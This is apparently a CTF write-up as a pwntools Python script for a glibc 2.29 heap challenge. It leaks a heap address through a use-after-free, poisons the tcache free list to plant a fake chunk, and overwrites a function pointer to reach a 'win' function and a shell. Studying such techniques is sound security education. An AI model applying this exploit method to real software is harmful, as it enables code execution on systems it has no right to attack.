'''
Tcache Challenge writeup:
- Run on GLibC version 2.29
'''

from pwn import * 

mode = 'DEBUG' # Turn on gdb
libc_name='/home/strikeout/Desktop/tools/how2heap/glibc_versions/libc-2.29.so'
env = {}

# Binary setup
elf_name = 'happy-bck'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process(elf.path,env=env)
	gdb.attach(p)
else: 
	p = remote(domain, port) 


def get_kid(name, age):
	p.sendlineafter(">", "1") 

	# Send the name
	p.sendlineafter(":", str(name))

	# Send the age
	p.sendlineafter(":", str(age))
	return 

def edit_kid(index, name, age):
	p.sendlineafter(">", "4" )
	
	# Send the index 
	p.sendlineafter(":", str(index))
	# Send the name
	p.sendlineafter(":", str(name))
	# Send the age
	p.sendlineafter(":", str(age))
	return 

def free_kid(index):
	p.sendlineafter(">", "3") 

	# The index of the kid to free
	p.sendlineafter(":",str(index))

def see_kid(index): 
	p.sendlineafter(">", "2") 

	# Send the index to view
	p.sendlineafter(":", str(index))

	# Read the name
	p.recvuntil(":") 
	name = p.recvline()

	# Read the age
	p.recvuntil(":")  
	age = p.recvline() 
	return name, age 

print("Step 1: heap leak")
print("=================")
'''
The main vulnerability is a use-after-free for the kids in the array. This same vulnerability can also be used for a double free scenario.

With the use after free, we can do the following things: 
- double free a kid 
- print the attributes of a kid 
- edit the kid
'''

# Create three kids
get_kid("Maxwell", 5) # Index 0: Use for UAF later
get_kid("Maxwell2",6) # Index 1: Use for part of fake_chunk later.
get_kid("Maxwell3", 7) 
get_kid("Maxwell4", 8) 

# Free two of them. The key is that index 0 was freed second. So, it points to index 2's chunk. And (most importantly) it is accessible by us.
free_kid(2)
free_kid(0)

'''
Each struct looks like the following in memory: 
8 bytes (age) 
20 bytes (name) 
8 bytes (print_info) 

Once this struct is freed this will go into the fastbin (because of the small size, it goes into the 0x30 tcache).

Recall that tcache have an fd ptr (in the first part of the data of the chunk) that points to the next tcache chunk...

So, this means that the first entry of the struct will have a tcache ptr to the next entry (if it's not the last item in the list).

We use the UAF on the kid in order to print a heap address (fd of the tcache chunk).
'''

name, age = see_kid(0)
leak = int(age)

# In order to get the top of the heap; the first 12 bits are always the same. So, we 0 these out to use for offsets later
leak = leak & 0xFFFFFFFFFFFFF000
print("Leaked heap address...", hex(leak))

print("Step 2: Fake chunk Over Function Ptr")
print("====================================") 

'''
This could be done in the previous steps. But, for simplicity, we will recreate all of the chunks now.

Currently, the 'kid' at index 0 is freed (and writable). 
The 'age' field (also the fd pointer of the fastbin) leaks this pointer previously. 
However, if we can **overwrite** the fd pointer, we can **create** a fake chunk at ANY location.

Now, where is the best place to create a fake_chunk at? 
	- Well, the age struct has a beautiful function pointer that we can overwrite! 
	- So, let's create a fake chunk there! 

Unlike fastbins, there is no security check on the size (making it too easy). 
So, just put a chunk wherever you want!

Once we have access to the fake chunk, write over the function pointer to the 'win' function for code execution!


Steps: 
- Overwrite kid 0's fd pointer to point to fake chunk 
- Create a fake chunk within one of the kids, that is close to the function pointer
- Get the fake chunk 
- Write over the function pointer to point to 'win'.
- Profit :) 
'''

# The location to put the fake_chunk. This will be right next to the function pointer, in the struct.
edit_kid(1, "B" * 0x10, 0x0)

# Overwrite the fd pointer of the fastbin chunk to point to the fake_chunk (created in the previous line)
# The offset is different than fastbins because the tcache bins itself are inside of a 0x290) malloc allocation
fake_chunk_ptr = leak + 0x2e8
edit_kid(0, "?", fake_chunk_ptr)

# The fake_chunk is in the second index of the linked list of the fastbin. So, remove the first one.
get_kid("A" * 8, 1)

# Get the fake_chunk (at the top of the fastbin)
# Also, the fake_chunk is right next to function_ptr of the 'kid' in index 1. 
# So, we write a new function ptr in order to pop a shell.
# Two options... find a gadget (one_gadget) or JUMP to this from another gadget.
get_kid(p64(elf.symbols['win']), 2) 

print("Pop shell!")
# Print kid info option
p.sendlineafter('>', '2') 

# Index 1 has the overwritten function pointer. Pwned :)
p.sendlineafter(':', '1') 

p.interactive()

